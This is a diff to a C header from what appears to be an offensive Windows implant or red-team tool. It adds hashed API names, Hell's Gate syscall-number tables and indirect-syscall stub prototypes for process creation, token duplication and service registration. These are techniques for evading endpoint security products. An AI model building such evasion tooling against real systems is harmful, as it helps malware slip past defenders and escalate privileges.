@@ -24,6 +24,20 @@
 #define H_NtEnumerateKey             0x6A5E8ED6
 #define H_NtOpenProcessToken         0x7BD07459
 #define H_NtAdjustPrivilegesToken    0x6921F9CD
+#define H_NtGetNextProcess           0x62B37525
+#define H_NtCreateProcessEx          0xA9E925B7
+#define H_NtDuplicateToken           0x3000ECC3
+#define H_NtSetInformationThread     0x54212E31
+#define H_NtDelayExecution           0x0A49084A
+#define H_NtCreateUserProcess        0x5F8E4559
+#define H_NtWaitForSingleObject      0x4C6DC63C
+#define H_RtlCreateProcessParametersEx 0x19132CBB
+#define H_RtlDestroyProcessParameters  0xE916BC14
+
+#define H_LdrLoadDll                    0x0307DB23
+#define H_StartServiceCtrlDispatcherW   0x88F0D677
+#define H_RegisterServiceCtrlHandlerW   0x65925C45
+#define H_SetServiceStatus              0x908AD246
 
 /* Syscall numbers (resolved at runtime via Hell's Gate) */
 typedef struct _SYSCALL_TABLE {
@@ -46,6 +60,13 @@ typedef struct _SYSCALL_TABLE {
     DWORD NtEnumerateKey;
     DWORD NtOpenProcessToken;
     DWORD NtAdjustPrivilegesToken;
+    DWORD NtGetNextProcess;
+    DWORD NtCreateProcessEx;
+    DWORD NtDuplicateToken;
+    DWORD NtSetInformationThread;
+    DWORD NtDelayExecution;
+    DWORD NtCreateUserProcess;
+    DWORD NtWaitForSingleObject;
 } SYSCALL_TABLE;
 
 /* Address of `syscall` instruction in ntdll (for indirect calls) */
@@ -69,6 +90,19 @@ typedef struct _SYSCALL_ADDR_TABLE {
     PVOID NtEnumerateKey;
     PVOID NtOpenProcessToken;
     PVOID NtAdjustPrivilegesToken;
+    PVOID NtGetNextProcess;
+    PVOID NtCreateProcessEx;
+    PVOID NtDuplicateToken;
+    PVOID NtSetInformationThread;
+    PVOID NtDelayExecution;
+    PVOID NtCreateUserProcess;
+    PVOID NtWaitForSingleObject;
+    PVOID RtlCreateProcessParametersEx;
+    PVOID RtlDestroyProcessParameters;
+    PVOID LdrLoadDll;
+    PVOID pfnStartDispatcher;
+    PVOID pfnRegHandler;
+    PVOID pfnSetStatus;
 } SYSCALL_ADDR_TABLE;
 
 extern SYSCALL_TABLE g_ssn;
@@ -76,6 +110,7 @@ extern SYSCALL_ADDR_TABLE g_addr;
 extern PVOID g_ret_gadget;
 
 BOOL resolve_syscalls(void);
+BOOL resolve_service_funcs(void);
 
 /* Indirect syscall stubs (defined in syscalls_gas.S / syscalls.asm)
  * Each variant shifts N stack slots to fix the +0x10 offset from
@@ -149,6 +184,27 @@ NTSTATUS sys_NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
 NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
     PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
     PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
+
+NTSTATUS sys_NtGetNextProcess(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+    ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle);
+
+NTSTATUS sys_NtCreateProcessEx(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags,
+    HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort,
+    ULONG InJob);
+
+NTSTATUS sys_NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
+    TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
+
+NTSTATUS sys_NtSetInformationThread(HANDLE ThreadHandle,
+    DWORD ThreadInformationClass, PVOID ThreadInformation,
+    ULONG ThreadInformationLength);
+
+NTSTATUS sys_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
+
+NTSTATUS sys_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
+    PLARGE_INTEGER Timeout);
 
 /* PEB helpers */
 PVOID get_peb(void);
